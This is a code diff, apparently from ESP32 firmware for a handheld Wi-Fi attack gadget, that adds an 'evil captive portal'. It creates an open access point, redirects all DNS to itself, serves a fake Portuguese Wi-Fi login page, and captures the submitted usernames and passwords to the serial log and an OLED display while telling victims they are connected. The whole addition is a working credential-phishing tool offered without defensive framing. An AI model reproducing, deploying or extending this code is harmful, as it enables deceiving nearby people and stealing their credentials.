@@ -978,3 +978,210 @@ namespace Jammer {
     delay(50);
   }
 }
+
+namespace EvilPortal {
+  int menuIndex = 0;
+  const char* menuItems[] = {"SSID:", "IP:", "Creds:", "Active:"};
+  const int menuSize = 4;
+
+  unsigned long lastDebounceTimeBT1 = 0;
+  unsigned long lastDebounceTimeBT2 = 0;
+  unsigned long lastDebounceTimeBT3 = 0;
+  unsigned long lastDebounceTimeBT4 = 0;
+  unsigned long debounceDelay = 200;
+
+  int connectedClients = 0;
+
+  bool portalActive = false;
+
+  // The AP related stuff
+  const char *ssid = "CTRL";
+  const byte DNS_PORT = 53;
+
+  IPAddress myIP;
+  DNSServer dnsServer;
+  AsyncWebServer server(80);
+
+  const char index_html[] PROGMEM = R"rawliteral(
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Wi-Fi</title>
+  </head>
+  <body>
+    <h1>Acesso à Internet</h1>
+    <form action="/login" method="POST">
+      Usuário: <input type="text" name="user"><br>
+      Senha: <input type="password" name="pass"><br>
+      <input type="submit" value="Entrar">
+    </form>
+  </body>
+  </html>
+  )rawliteral";
+
+  std::vector<std::string> capturedCreds;
+
+  void handleButtonPress(int pin, unsigned long &lastDebounceTime, void (*callback)()) {
+    int reading = digitalRead(pin);
+    if (reading == LOW) {
+      unsigned long currentTime = millis();
+      if ((currentTime - lastDebounceTime) > debounceDelay) {
+        Serial.println("Button press: Pin=" + String(pin) + ", Callback=" +
+                       (pin == BUTTON_UP_PIN ? "navigateUp" :
+                        pin == BTN_PIN_RIGHT ? "changeOptionRight" :
+                        pin == BUTTON_DOWN_PIN ? "navigateDown" : "changeOptionLeft"));
+        callback();
+        lastDebounceTime = currentTime;
+      }
+    }
+  }
+
+  void activatePortal() {
+    portalActive = !portalActive;
+  }
+
+  void viewCapturedCredentials() {
+    u8g2.clearBuffer();
+    
+    u8g2.setFont(u8g2_font_profont11_tf);
+    u8g2.drawHLine(0, 0, 4); u8g2.drawVLine(0, 0, 4);
+    u8g2.drawHLine(124, 0, 4); u8g2.drawVLine(127, 0, 4);
+    u8g2.drawHLine(0, 63, 4); u8g2.drawVLine(0, 60, 4);
+    u8g2.drawHLine(124, 63, 4); u8g2.drawVLine(127, 60, 4);
+
+    u8g2.setFont(u8g2_font_5x7_tf);
+
+    for (int i = 0; i < capturedCreds.size(); i++) {
+      int y = (i == 0) ? 10 : (i == 1) ? 25 : (i == 2) ? 40 : 60;
+      u8g2.setCursor(5, y);
+      u8g2.print(capturedCreds[i].c_str());
+    }
+    
+    u8g2.sendBuffer();
+    delay(5000);
+  }
+
+  void navigateUp() {
+    menuIndex = (menuIndex - 1 + menuSize) % menuSize;
+    Serial.println("Navigate Up: menuIndex = " + String(menuIndex));
+  }
+
+  void navigateDown() {
+    menuIndex = (menuIndex + 1) % menuSize;
+    Serial.println("Navigate Down: menuIndex = " + String(menuIndex));
+  }
+
+  void changeOptionRight() {
+    if (menuIndex == 2) {
+      viewCapturedCredentials();
+    } else if (menuIndex == 3) {
+      activatePortal();
+    }
+  }
+
+  void changeOptionLeft() {
+    if (menuIndex == 2) {
+      viewCapturedCredentials();
+    } else if (menuIndex == 3) {
+      activatePortal();
+    }
+  }
+
+  void updateDisplay() {
+    u8g2.clearBuffer();
+    u8g2.setFont(u8g2_font_profont11_tf);
+
+    u8g2.drawHLine(0, 0, 4); u8g2.drawVLine(0, 0, 4);
+    u8g2.drawHLine(124, 0, 4); u8g2.drawVLine(127, 0, 4);
+    u8g2.drawHLine(0, 63, 4); u8g2.drawVLine(0, 60, 4);
+    u8g2.drawHLine(124, 63, 4); u8g2.drawVLine(127, 60, 4);
+
+    int xshift = 5;
+    u8g2.setFont(u8g2_font_profont11_tf);
+    for (int i = 0; i < menuSize; i++) {
+      int y = (i == 0) ? 10 : (i == 1) ? 25 : (i == 2) ? 40 : 60;
+      if (menuIndex == i) {
+        u8g2.setFont(u8g2_font_5x7_tf);
+        u8g2.drawStr(0 + xshift, y - 1, ">");
+        u8g2.setFont(u8g2_font_profont11_tf);
+        u8g2.drawStr(8 + xshift, y, menuItems[i]);
+      } else {
+        u8g2.setFont(u8g2_font_5x7_tf);
+        u8g2.drawStr(8 + xshift, y, menuItems[i]);
+      }
+
+      u8g2.setCursor(64 + xshift, y);
+      u8g2.setFont(u8g2_font_5x7_tf);
+      if (i == 0) {
+        u8g2.print(ssid);
+      } else if (i == 1) {
+        u8g2.print(myIP);
+      } else if (i == 2) {
+        u8g2.print(connectedClients);
+      } else {
+        u8g2.print(portalActive ? "Active" : "disable");
+      }
+    }
+    u8g2.sendBuffer();
+  }
+
+  void startPortal() {
+    Serial.print("Starting evil captive portal with SSID: ");
+    Serial.print(ssid);
+
+    WiFi.softAP(ssid);
+
+    myIP = WiFi.softAPIP();
+
+    dnsServer.start(DNS_PORT, "*", myIP);
+
+    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+      request->send_P(200, "text/html", index_html);
+    });
+
+    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
+      connectedClients += 1;
+      String user = request->getParam("user", true)->value();
+      String pass = request->getParam("pass", true)->value();
+
+      if (capturedCreds.size() >= 4) capturedCreds.clear();
+      capturedCreds.push_back(std::string((user + ":" + pass).c_str()));
+      
+      Serial.println("Credenciais capturadas:");
+      Serial.println("Usuário: " + user);
+      Serial.println("Senha: " + pass);
+      request->send(200, "text/html", "<h2>Conectado!</h2><p>Você agora tem acesso à internet</p>");
+    });
+
+    server.begin();
+  }
+
+  void captivePortalSetup() {
+    Serial.begin(115200);
+
+    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
+    pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
+    pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
+    pinMode(BTN_PIN_LEFT, INPUT_PULLUP);
+
+    u8g2.begin();
+    updateDisplay();
+
+    startPortal();
+  }
+
+  void captivePortalLoop() {
+    handleButtonPress(BUTTON_UP_PIN, lastDebounceTimeBT1, navigateUp);
+    handleButtonPress(BTN_PIN_RIGHT, lastDebounceTimeBT2, changeOptionRight);
+    handleButtonPress(BUTTON_DOWN_PIN, lastDebounceTimeBT3, navigateDown);
+    handleButtonPress(BTN_PIN_LEFT, lastDebounceTimeBT4, changeOptionLeft);
+
+    updateDisplay();
+
+    dnsServer.processNextRequest();
+
+    delay(50);
+  }
+}
